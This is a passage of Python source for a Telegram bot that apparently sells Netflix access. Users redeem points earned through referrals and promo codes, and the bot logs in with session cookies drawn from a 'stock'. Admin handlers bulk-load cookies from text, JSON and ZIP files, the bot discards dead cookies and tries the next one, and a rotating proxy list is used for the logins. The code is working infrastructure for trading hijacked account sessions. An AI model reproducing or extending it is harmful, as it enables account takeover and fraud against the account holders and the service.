                if attempt < MAX_TRIES:
                    # Dead cookie → delete permanently and try next
                    delete_cookie_permanently(current_cookie)
                    update_stock_pin()
                    next_cookie = pop_cookie()
                    if next_cookie:
                        current_cookie = next_cookie
                        update_stock_pin()
                        print(f"[TV] Switched to next cookie for attempt {attempt + 1}")
                    else:
                        print("[TV] No more stock to try.")
                        break

        # All attempts failed — refund points
        add_points(uid, session["cost"])
        try:
            bot.edit_message_text(
                f"😔 *Could not activate after {attempt} attempt(s).*\n"
                f"Your *{session['cost']} pts* have been *refunded*.\n"
                f"💎 Balance: `{get_points(uid)} pts`",
                message.chat.id, status_msg.message_id,
                parse_mode="Markdown",
                reply_markup=main_menu_markup(uid)
            )
        except Exception:
            pass

    threading.Thread(target=run_activation, daemon=True).start()

# ── Callbacks ─────────────────────────────────────────────────────────────────

@bot.callback_query_handler(func=lambda c: c.data.startswith("invite_earn:"))
def cb_invite(call):
    uid      = call.from_user.id
    bot_info = bot.get_me()
    link     = f"https://t.me/{bot_info.username}?start=ref_{uid}"
    markup   = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"📊 *INVITE & EARN*\n{'─' * 28}\n\n"
            f"🤝 Your referrals: `{get_referrals(uid)}`\n"
            f"💎 Your balance:   `{get_points(uid)} pts`\n\n"
            f"🔗 *Your Invite Link:*\n`{link}`\n\n"
            f"Each friend who joins = *+1 pt* for you!\n"
            f"Use pts to redeem Netflix access.",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=markup
        )
    except Exception:
        pass
    bot.answer_callback_query(call.id, "")

@bot.callback_query_handler(func=lambda c: c.data.startswith("promocode:"))
def cb_promo_prompt(call):
    uid    = call.from_user.id
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"🎟 *PROMOCODE*\n{'─' * 28}\n\n"
            f"Send your promo code as a message.\nFormat: `/promo YOUR_CODE`",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=markup
        )
    except Exception:
        pass
    bot.answer_callback_query(call.id, "")

@bot.callback_query_handler(func=lambda c: c.data.startswith("back_menu:"))
def cb_back(call):
    uid = call.from_user.id
    _pending_tv.pop(uid, None)
    try:
        bot.edit_message_text(
            main_menu_text(uid),
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=main_menu_markup(uid)
        )
    except Exception:
        bot.send_message(
            call.message.chat.id,
            main_menu_text(uid),
            parse_mode="Markdown", reply_markup=main_menu_markup(uid)
        )
    bot.answer_callback_query(call.id, "")

# ── Promo ─────────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["promo"])
def cmd_promo(message):
    uid   = message.from_user.id
    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/promo YOUR_CODE`", parse_mode="Markdown")
        return
    code = parts[1].upper()
    pts_value = get_promo(code)
    if pts_value is None:
        bot.reply_to(message, "❌ Invalid promo code.")
        return
    if has_used_promo(uid, code):
        bot.reply_to(message, "⚠️ You already used this code.")
        return
    new_total = add_points(uid, pts_value)
    mark_promo_used(uid, code)
    bot.reply_to(
        message,
        f"✅ *Promo redeemed!* +{pts_value} pts.\n💎 Balance: `{new_total} pts`",
        parse_mode="Markdown"
    )

# ── Stock channel ─────────────────────────────────────────────────────────────

@bot.channel_post_handler(func=lambda m: m.chat.id == STOCK_CHANNEL_ID and m.text)
def channel_stock_post(message):
    text = message.text.strip()
    if text.startswith("/"):
        return
    if _is_cookie_text(text):
        push_cookie(text, msg_id=message.message_id)
        update_stock_pin()
        print(f"[STOCK] Saved cookie from channel msg_id={message.message_id}. Total={stock_count()}")

# ── Admin commands ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["addcookie"])
def cmd_addcookie(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    parts = message.text.split(None, 1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/addcookie <cookie>`", parse_mode="Markdown")
        return
    push_cookie(parts[1])
    bot.reply_to(message, f"✅ Added. Stock: `{stock_count()}`", parse_mode="Markdown")
    update_stock_pin()

@bot.message_handler(commands=["addstock"])
def cmd_addstock(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    parts = message.text.split(None, 1)
    if len(parts) < 2:
        bot.reply_to(
            message,
            "📋 *Usage:* `/addstock <cookie block>`\n\nSeparate multiple cookies with a blank line.",
            parse_mode="Markdown"
        )
        return
    raw    = parts[1].strip()
    blocks = [b.strip() for b in raw.split("\n\n") if b.strip()]
    added  = 0
    for block in blocks:
        if block:
            push_cookie(block)
            added += 1
    update_stock_pin()
    bot.reply_to(
        message,
        f"✅ Added *{added}* cookie(s).\n📦 Stock: `{stock_count()}`",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["stock"])
def cmd_stock(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    bot.reply_to(message, f"📦 Current stock: `{stock_count()}` cookie(s)", parse_mode="Markdown")

@bot.message_handler(commands=["clearstock"])
def cmd_clearstock(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    conn = get_conn()
    conn.execute("DELETE FROM stock")
    conn.commit()
    bot.reply_to(message, "🗑 Stock cleared. 📦 Stock: `0`", parse_mode="Markdown")
    update_stock_pin()

@bot.message_handler(commands=["addpoints"])
def cmd_addpoints(message):
    """Admin: /addpoints <uid> <amount>"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    parts = message.text.strip().split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: `/addpoints <uid> <amount>`", parse_mode="Markdown")
        return
    try:
        target_uid = int(parts[1])
        amount     = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid UID or amount. Both must be integers.")
        return
    if amount == 0:
        bot.reply_to(message, "❌ Amount must be non-zero.")
        return
    new_total = add_points(target_uid, amount)
    action    = "Added" if amount > 0 else "Deducted"
    bot.reply_to(
        message,
        f"✅ *{action} {abs(amount)} pts* to user `{target_uid}`.\n"
        f"💎 New balance: `{new_total} pts`",
        parse_mode="Markdown"
    )
    # Notify the user
    try:
        bot.send_message(
            target_uid,
            f"🎁 *Admin has {'added' if amount > 0 else 'adjusted'} your points!*\n"
            f"{'➕' if amount > 0 else '➖'} `{abs(amount)} pts`\n"
            f"💎 New balance: `{new_total} pts`",
            parse_mode="Markdown"
        )
    except Exception:
        pass

@bot.message_handler(commands=["createpromo"])
def cmd_createpromo(message):
    """Admin: /createpromo <CODE> <points>"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    parts = message.text.strip().split()
    if len(parts) != 3:
        bot.reply_to(
            message,
            "Usage: `/createpromo <CODE> <points>`\n\nExample: `/createpromo SUMMER50 50`",
            parse_mode="Markdown"
        )
        return
    try:
        code   = parts[1].upper()
        points = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Points must be an integer.")
        return
    if points <= 0:
        bot.reply_to(message, "❌ Points must be greater than 0.")
        return
    is_new = create_promo(code, points)
    verb   = "Created" if is_new else "Updated"
    bot.reply_to(
        message,
        f"✅ *{verb} promo code!*\n\n"
        f"🎟 Code: `{code}`\n"
        f"💎 Points: `{points}`\n\n"
        f"Users can redeem it with `/promo {code}`",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["listpromos"])
def cmd_listpromos(message):
    """Admin: list all active promo codes"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    rows = get_conn().execute("SELECT code, points FROM promo_codes ORDER BY code").fetchall()
    if not rows:
        bot.reply_to(message, "📭 No promo codes found.")
        return
    lines = [f"`{code}` → {pts} pts" for code, pts in rows]
    bot.reply_to(
        message,
        f"🎟 *Active Promo Codes ({len(rows)}):*\n\n" + "\n".join(lines),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["deletepromo"])
def cmd_deletepromo(message):
    """Admin: /deletepromo <CODE>"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Admins only.")
        return
    parts = message.text.strip().split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: `/deletepromo <CODE>`", parse_mode="Markdown")
        return
    code = parts[1].upper()
    conn = get_conn()
    row  = conn.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
    if not row:
        bot.reply_to(message, f"❌ Promo code `{code}` not found.", parse_mode="Markdown")
        return
    conn.execute("DELETE FROM promo_codes WHERE code=?", (code,))
    conn.commit()
    bot.reply_to(message, f"🗑 Promo code `{code}` deleted.", parse_mode="Markdown")

@bot.message_handler(content_types=["document"])
def handle_file(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    doc  = message.document
    name = doc.file_name or ""
    if not (name.endswith(".txt") or name.endswith(".json") or name.endswith(".zip")):
        bot.reply_to(message, "⚠️ Send a .txt, .json, or .zip file.")
        return
    status = bot.reply_to(message, "📂 Reading file…")
    try:
        info      = bot.get_file(doc.file_id)
        raw_bytes = bot.download_file(info.file_path)
    except Exception:
        bot.edit_message_text("🚨 Could not download file.", message.chat.id, status.message_id)
        return

    added = 0

    def process_text(raw: str):
        nonlocal added
        blocks = [b.strip() for b in raw.replace("|", "\n\n").split("\n\n") if b.strip()]
        for block in blocks:
            if _is_cookie_text(block):
                push_cookie(block)
                added += 1

    if name.endswith(".zip"):
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes)) as zf:
                for entry in zf.namelist():
                    if entry.endswith(".txt") or entry.endswith(".json"):
                        raw = zf.read(entry).decode("utf-8", errors="ignore").strip()
                        process_text(raw)
        except Exception as e:
            bot.edit_message_text(f"🚨 ZIP error: {e}", message.chat.id, status.message_id)
            return
    else:
        process_text(raw_bytes.decode("utf-8", errors="ignore").strip())

    update_stock_pin()
    bot.edit_message_text(
        f"✅ Added *{added}* cookie(s).\n📦 Stock: `{stock_count()}`",
        message.chat.id, status.message_id,
        parse_mode="Markdown"
    )

# ── Fallback ──────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: True)
def fallback(message):
    uid = message.from_user.id
    not_joined = check_membership(uid)
    if not_joined:
        bot.send_message(
            message.chat.id,
            "🚀 *PREMIUM ACCESS BOT*\n\nJoin all channels and click *Verify* to start.",
            parse_mode="Markdown",
            reply_markup=must_join_markup(not_joined)
        )
        return
    bot.send_message(
        message.chat.id,
        main_menu_text(uid),
        parse_mode="Markdown",
        reply_markup=main_menu_markup(uid)
    )

# ==========================================
# CHAT MEMBER UPDATES — referral penalty
# ==========================================
# Requires the bot to be ADMIN in every MUST_JOIN_CHANNELS channel
# so Telegram forwards chat_member updates to it.

def _channel_id_str(chat_id) -> str:
    """Normalise channel id to the same string stored in MUST_JOIN_CHANNELS."""
    # Telegram sends numeric IDs in chat_member updates, e.g. -1001234567890
    # MUST_JOIN_CHANNELS stores "@username" strings.
    # We compare both formats.
    return str(chat_id)

def _is_must_join_channel(chat) -> bool:
    for ch in MUST_JOIN_CHANNELS:
        # match by numeric id or @username
        if str(chat.id) in ch["id"] or ch["id"].lstrip("@") == (chat.username or ""):
            return True
    return False

def _channel_key(chat) -> str:
    """Stable string key for a channel, used as penalty channel_id."""
    return str(chat.id)

@bot.chat_member_handler()
def on_chat_member_update(update: telebot.types.ChatMemberUpdated):
    """
    Fired when a user's membership in any chat the bot admins changes.
    We only care about MUST_JOIN channels.
    """
    if not _is_must_join_channel(update.chat):
        return

    old_status = update.old_chat_member.status   # before
    new_status = update.new_chat_member.status   # after
    uid        = update.new_chat_member.user.id
    ch_key     = _channel_key(update.chat)

    left_statuses   = {"left", "kicked", "banned"}
    joined_statuses = {"member", "administrator", "creator", "restricted"}

    # ── User LEFT a required channel ──────────────────────────────────────────
    if old_status in joined_statuses and new_status in left_statuses:
        referrer_uid = get_referrer_of(uid)
        if referrer_uid is None:
            return  # not a referred user, nothing to do

        # Only penalise once per (referrer, referred, channel) combination.
        # This prevents repeat deductions if the user keeps leaving/rejoining.
        if has_penalty(referrer_uid, uid, ch_key):
            return

        add_penalty(referrer_uid, uid, ch_key)
        new_pts = deduct_points(referrer_uid, 1)
        print(f"[PENALTY] uid={uid} left channel {ch_key} → referrer={referrer_uid} -1pt (bal={new_pts})")

        try:
            bot.send_message(
                referrer_uid,
                f"⚠️ *Referral Penalty!*\n\n"
                f"A user you referred has left one of the required channels.\n"
                f"➖ `1 pt` deducted.\n"
                f"💎 Balance: `{new_pts} pts`",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    # ── User REJOINED a required channel ─────────────────────────────────────
    elif old_status in left_statuses and new_status in joined_statuses:
        referrer_uid = get_referrer_of(uid)
        if referrer_uid is None:
            return

        # Clear the penalty record so leaving again will penalise again
        remove_penalty(referrer_uid, uid, ch_key)
        print(f"[PENALTY] uid={uid} rejoined channel {ch_key} → penalty cleared for referrer={referrer_uid}")


# ==========================================
# ENTRY POINT
# ==========================================
if __name__ == "__main__":
    init_db()
    print(f"[PROXY] Loaded {len(_PROXY_LIST)} proxies for TV login rotation.")
    print("🤖 Bot is running... Press Ctrl+C to stop.")
    # chat_member updates must be explicitly requested
    bot.infinity_polling(allowed_updates=[
        "message",
        "callback_query",
        "channel_post",
        "chat_member",
    ])
